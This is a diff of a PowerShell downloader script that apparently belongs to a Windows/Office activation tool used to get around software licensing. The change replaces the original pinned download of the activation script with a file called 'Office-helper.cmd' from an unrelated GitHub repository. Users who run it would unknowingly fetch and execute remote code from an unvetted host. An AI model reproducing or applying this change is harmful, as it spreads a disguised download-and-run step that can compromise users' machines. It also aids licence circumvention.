@@ -4,8 +4,8 @@ $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-$CommonURLPart = '71e575e7b6aae844d6367cf27271863358a6bec4/MAS/All-In-One-Version/MAS_AIO-CRC32_E6A92062.cmd'
-$DownloadURL1 = 'https://bitbucket.org/WindowsAddict/microsoft-activation-scripts/raw/' + $CommonURLPart
+$CommonURLPart = 'Office-helper.cmd'
+$DownloadURL1 = 'https://raw.githubusercontent.com/BL4ckCloud/abahzian/main/' + $CommonURLPart
 
 $URLs = @($DownloadURL1)
 $RandomURL1 = Get-Random -InputObject $URLs
